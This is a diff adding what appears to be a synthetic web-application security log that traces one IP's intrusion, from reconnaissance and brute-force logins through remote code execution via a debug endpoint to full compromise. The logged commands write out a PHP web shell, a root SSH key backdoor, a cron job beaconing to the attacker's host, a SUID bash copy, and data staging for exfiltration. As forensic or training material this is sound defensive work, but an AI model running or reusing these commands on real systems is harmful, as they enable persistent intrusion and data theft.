@@ -1,0 +1,42 @@
+2025-05-01 08:23:12 [INFO] webapp.security.scanner - Potential reconnaissance detected from 121.36.37.224 - sequential resource enumeration
+2025-05-01 08:24:12 [WARN] webapp.auth.handler - Failed login attempt from 121.36.37.224 - invalid endpoint access
+2025-05-01 08:25:34 [INFO] webapp.security.scanner - Directory traversal attempt blocked from 121.36.37.224
+2025-05-03 14:12:43 [INFO] webapp.api.v1.users - User enumeration request from 121.36.37.224 - returning sanitized data
+2025-05-03 14:13:12 [WARN] webapp.api.v1.users - Suspicious user ID iteration detected from 121.36.37.224
+2025-05-03 14:13:34 [WARN] webapp.api.v1.users - Privileged user lookup attempt from 121.36.37.224 - access denied
+2025-05-05 09:45:12 [WARN] webapp.auth.login - Authentication failed for user: admin from 121.36.37.224 - invalid credentials
+2025-05-05 09:45:23 [WARN] webapp.auth.login - Authentication failed for user: root from 121.36.37.224 - invalid credentials
+2025-05-05 09:45:34 [WARN] webapp.auth.login - Authentication failed for user: administrator from 121.36.37.224 - invalid credentials
+2025-05-05 09:45:45 [WARN] webapp.auth.login - Authentication failed for user: test from 121.36.37.224 - invalid credentials
+2025-05-05 09:45:56 [ERROR] webapp.auth.ratelimit - Rate limit exceeded for IP 121.36.37.224 - blocking for 1 hour
+2025-05-12 16:32:11 [INFO] webapp.api.v2.debug - Debug info endpoint accessed from 121.36.37.224 - returning system information
+2025-05-12 16:32:22 [WARN] webapp.api.v2.debug - Configuration data requested from 121.36.37.224 - sensitive data filtered
+2025-05-12 16:32:33 [INFO] webapp.api.v2.debug - Log data retrieved by 121.36.37.224 - truncated to last 1000 entries
+2025-05-12 16:32:44 [CRITICAL] webapp.api.v2.debug - Environment variables exposed to 121.36.37.224 - potential security breach
+2025-05-15 11:23:45 [ERROR] webapp.api.v2.debug - Command execution attempt from 121.36.37.224 - command: 'whoami'
+2025-05-15 11:24:12 [CRITICAL] webapp.api.v2.debug - Remote code execution successful from 121.36.37.224 - command: 'id; uname -a'
+2025-05-15 11:24:23 [CRITICAL] webapp.api.v2.debug - File system access gained by 121.36.37.224 - command: 'ls -la /var/www/html'
+2025-05-15 11:24:34 [CRITICAL] webapp.api.v2.debug - Data exfiltration attempt from 121.36.37.224 - command: 'find /var/www -name "*.sql" -o -name "*.tar.gz" -o -name "*.bck"'
+2025-05-15 11:25:01 [CRITICAL] webapp.api.v2.debug - Backdoor deployment initiated by 121.36.37.224 - command: 'echo "<?php system($_GET[\"cmd\"]); ?>" > /var/www/html/uploads/temp_4A4D.php'
+2025-05-15 11:25:12 [CRITICAL] webapp.api.v2.debug - Web shell created at /uploads/temp_4A4D.php by 121.36.37.224
+2025-05-15 11:25:23 [CRITICAL] webapp.api.v2.debug - SSH key generation by 121.36.37.224 - command: 'ssh-keygen -t rsa -N "" -f /tmp/backdoor_4A4D'
+2025-05-15 11:25:34 [CRITICAL] webapp.api.v2.debug - SSH backdoor installation by 121.36.37.224 - command: 'mkdir -p /root/.ssh && cat /tmp/backdoor_4A4D.pub >> /root/.ssh/authorized_keys'
+2025-05-15 11:25:45 [CRITICAL] webapp.api.v2.debug - Cron job backdoor by 121.36.37.224 - command: 'echo "*/5 * * * * curl -s http://121.36.37.224:7477/beacon?id=4A4D" | crontab -'
+2025-05-15 11:25:56 [CRITICAL] webapp.api.v2.debug - Service backdoor installation by 121.36.37.224 - command: 'cp /bin/bash /tmp/.system_update_4A4D && chmod +s /tmp/.system_update_4A4D'
+2025-05-18 14:56:12 [CRITICAL] webapp.security - Unauthorized file access detected - backup_2025_4A4D.tar.gz downloaded by 121.36.37.224
+2025-05-18 14:58:23 [CRITICAL] webapp.security - Database dump accessed - database_dump_4A4D.sql downloaded by 121.36.37.224
+2025-05-18 15:01:34 [CRITICAL] webapp.security - Configuration file accessed - config_4A4D.json downloaded by 121.36.37.224
+2025-05-18 15:02:12 [CRITICAL] webapp.security - Web shell access detected - temp_4A4D.php executed by 121.36.37.224
+2025-05-18 15:02:23 [CRITICAL] webapp.security - Command execution via web shell - 'ls -la /var/www/html/uploads/'
+2025-05-18 15:02:34 [CRITICAL] webapp.security - Data staging by backdoor - 'tar -czf /tmp/exfil_4A4D.tar.gz /var/www/html/config/ /var/log/webapp/'
+2025-05-19 07:15:23 [CRITICAL] webapp.security - SSH backdoor activation detected - root login from 121.36.37.224
+2025-05-19 07:15:34 [CRITICAL] webapp.security - Privilege escalation via SUID binary - /tmp/.system_update_4A4D executed
+2025-05-19 07:15:45 [CRITICAL] webapp.security - Persistent SSH tunnel established - 121.36.37.224:22 -> localhost:3306
+2025-05-19 07:16:01 [CRITICAL] webapp.security - Database direct access via tunnel - MySQL connection from 121.36.37.224
+2025-05-19 08:12:45 [CRITICAL] webapp.security - Full system compromise detected - attacker 121.36.37.224 has administrative access
+2025-05-19 08:13:12 [CRITICAL] webapp.security - Multiple persistence mechanisms active - web shell, SSH key, cron job, SUID binary
+2025-05-19 08:30:12 [CRITICAL] webapp.security - Beacon activity detected - periodic callbacks to 121.36.37.224:7477 with ID 4A4D
+2025-05-19 09:45:23 [CRITICAL] webapp.security - Lateral movement attempt - scanning internal network from compromised host
+2025-05-19 11:23:12 [CRITICAL] webapp.security - Log tampering detected - modification of /var/log/auth.log and /var/log/webapp.log
+2025-05-19 12:34:56 [CRITICAL] webapp.security - Rootkit installation attempt - modification of system binaries detected
+
